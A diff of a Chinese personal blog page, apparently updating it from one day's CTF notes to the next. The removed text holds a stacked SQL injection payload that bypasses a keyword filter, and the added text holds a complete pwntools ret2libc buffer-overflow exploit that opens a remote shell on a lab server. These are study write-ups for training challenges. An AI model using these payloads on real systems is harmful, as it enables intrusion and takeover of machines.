@@ -17,7 +17,7 @@
   <meta name="description" content="瞎写糊涂账">
   <meta name="author" content="renex">
   <meta name="keywords" content="">
-  <title>20-10-08 - renex的杂烩集</title>
+  <title>20-10-09 - renex的杂烩集</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-10-08 10:59" pubdate>
-        October 8, 2020 am
+      <time datetime="2020-10-09 22:51" pubdate>
+        October 9, 2020 pm
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      206 字
+      461 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      2
+      5
        分钟
     </span>
   
@@ -217,28 +217,46 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">20-10-08</h1>
+            <h1 style="display: none">20-10-09</h1>
             
             <div class="markdown-body" id="post-body">
-              <p>supersqli(xctf)<br>进环境，处处提示可以sql注入。</p>
-<ul>
-<li>1’报错，1’#成功，字符串注入，同时可能报错注入</li>
-<li>1’ order by 2#正常回显，1’ order by 3#错误，两行</li>
-<li>1’ union select null,null#显示<div class="hljs"><pre><code class="hljs n1ql">returnpreg_match("/<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">",$inject);</span></code></pre></div></li>
-<li>select被正则过滤了，联合注入和报错注入都走不通</li>
-</ul>
-<p>查看题解，发现存在<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">堆叠注入</a></p>
-<ul>
-<li>1’;show tables#  得到两个表名：words，1919810931114514</li>
-<li>1’;show columns from `words` （反引号）</li>
-<li>1‘;show columns from `1919810931114514`发现flag 列名</li>
-<li>堆叠注入采用预编译方法绕过<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span>用于设置变量名和值 
-<span class="hljs-keyword">prepare</span>用于预备一个语句，并赋予名称，以后可以引用该语句 
-<span class="hljs-keyword">execute</span>执行语句 
-<span class="hljs-keyword">deallocate</span>  <span class="hljs-keyword">prepare</span>用来释放掉预处理的语句</code></pre></div>
-payload:<div class="hljs"><pre><code class="hljs sql">1';<span class="hljs-keyword">set</span> @<span class="hljs-keyword">sql</span> = <span class="hljs-keyword">concat</span>(<span class="hljs-string">'se'</span>,<span class="hljs-string">'lect flag from `1919810931114514`;'</span>);<span class="hljs-keyword">PREPARE</span> stml <span class="hljs-keyword">from</span> @<span class="hljs-keyword">sql</span>;<span class="hljs-keyword">execute</span> stml;<span class="hljs-comment">#</span></code></pre></div>
-</li>
-</ul>
+              <p>因为自己也写博客，也有在某些自己也不懂的地方糊弄的心思，所以总感觉看的许多同质化严重的博客文章也是这样。。。以后应该提升一下博客质量。。</p>
+<hr>
+<p>level3(xctf)<br>被plt-got表这一块困扰了很久，结果发现一直没有理解的是pwntools里面的elf.got函数。。<br>首先是一篇讲解很详细的参考文章<br> <a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a></p>
+<p>总结一下就是：<br>.plt表指向.got.plt表，由于延迟绑定，.got.plt在函数调用之前指向.plt表，在函数调用之后才写入外部函数具体地址</p>
+<p>再就是我一直理解错了的pwntools工具的elf.plt，elf.got函数，两者返回的是.plt表和.got.plt表的地址，而不是其存储的地址。。</p>
+<p>题目的具体思路就是：由于level3中没有system以及字符串/bin/sh，需要在给出的libc_32.so.6中寻找。要调用外部函数需要获得其地址。由于外部函数的偏移量是固定的，可以通过泄露write函数的地址来得到偏移。同时返回main函数二次利用漏洞避免外部函数偏移量改变。</p>
+<div class="hljs"><pre><code class="hljs lua">from pwn import *
+<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">"220.249.52.133"</span>,<span class="hljs-number">42977</span>)
+
+level3 = ELF(<span class="hljs-string">"level3"</span>)
+libc = ELF(<span class="hljs-string">"libc_32.so.6"</span>)
+
+write_plt_addr = level3.plt[<span class="hljs-string">'write'</span>]
+write_got_plt_addr = level3.got[<span class="hljs-string">'write'</span>]
+<span class="hljs-built_in">print</span>(hex(write_got_plt_addr))
+
+main_addr = level3.symbols[<span class="hljs-string">'main'</span>]
+
+#返回<span class="hljs-built_in">write</span>的plt表地址，参数分别为<span class="hljs-number">1</span>、write_got_plt_addr、<span class="hljs-number">4</span>，<span class="hljs-number">1</span>表示<span class="hljs-built_in">stdout</span>，即把.got.plt表的内容写入标准输出
+payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x04</span>) + p32(write_plt_addr) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got_plt_addr) + p32(<span class="hljs-number">4</span>)
+
+<span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">'Input:\n'</span>,payload)
+
+#收到标准输出的内容就是<span class="hljs-built_in">write</span>函数的真实地址
+write_got_addr = u32(<span class="hljs-built_in">io</span>.recv())
+
+<span class="hljs-built_in">print</span>(hex(write_got_addr))
+
+offset = write_got_addr - libc.symbols[<span class="hljs-string">'write'</span>]
+
+sys_addr = offset + libc.symbols[<span class="hljs-string">'system'</span>]
+bin_sh_addr = offset + libc.search(<span class="hljs-string">'/bin/sh'</span>).<span class="hljs-built_in">next</span>()
+
+payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x88</span>+<span class="hljs-number">0x04</span>) + p32(sys_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(bin_sh_addr)
+
+<span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">'Input:\n'</span>,payload)
+<span class="hljs-built_in">io</span>.interactive()</code></pre></div>
 
             </div>
             <hr>
@@ -262,18 +280,12 @@ payload:<div class="hljs"><pre><code class="hljs sql">1';<span class="hljs-keywo
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/10/09/20-10-09/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">20-10-09</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/10/07/20-10-7-%E8%B8%A9%E4%BD%8F%E5%9B%BD%E5%BA%86%E7%9A%84%E5%B0%BE%E5%B7%B4/">
-                        <span class="hidden-mobile">20-10-7-踩住国庆的尾巴</span>
+                      <a href="/2020/10/08/20-10-08/">
+                        <span class="hidden-mobile">20-10-08</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -416,7 +428,7 @@ payload:<div class="hljs"><pre><code class="hljs sql">1';<span class="hljs-keywo
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "20-10-08&nbsp;",
+        "20-10-09&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
